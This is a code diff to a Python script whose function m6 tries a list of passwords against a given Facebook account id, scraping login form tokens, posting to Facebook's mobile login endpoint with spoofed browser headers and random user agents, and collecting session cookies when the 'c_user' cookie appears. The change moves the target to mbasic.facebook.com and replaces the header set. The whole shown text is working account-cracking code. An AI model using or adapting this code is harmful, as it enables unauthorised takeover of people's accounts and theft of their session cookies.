@@ -1215,7 +1215,7 @@ def m6(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get('https://m.facebook.com').text
+   free_fb = session.get('https://mbasic.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1226,29 +1226,24 @@ def m6(idf,pwv):
             "email":idf,
             "pass":ps,
             "login":"Log In"}
-   header_freefb = {'accept': '*/*', 
-            'accept-language': 'en-US,en;q=0.9', 
-            'content-type': 'application/x-www-form-urlencoded', 
-            'dpr': '1', 
-            'origin': 'https://m.facebook.com', 
-            'referer': 'https://m.facebook.com/login.php', 
-            'sec-ch-prefers-color-scheme': 'light', 
-            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', 
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="123.0.6312.86", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.86"', 
-            'sec-ch-ua-mobile': '?0', 
-            'sec-ch-ua-model': '""', 
-            'sec-ch-ua-platform': '"Windows"', 
-            'sec-ch-ua-platform-version': '"10.0.0"', 
-            'sec-fetch-dest': 'empty', 
-            'sec-fetch-mode': 'cors', 
-            'sec-fetch-site': 'same-origin', 
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 
-            'viewport-width': '484', 
-            'x-asbd-id': '129477', 
-            'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'x-requested-with': 'XMLHttpRequest', 
-            'x-response-format': 'JSONStream'}
-   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+   header_freefb = {
+            'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'referer': 'https://m.facebook.com',
+            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+   lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
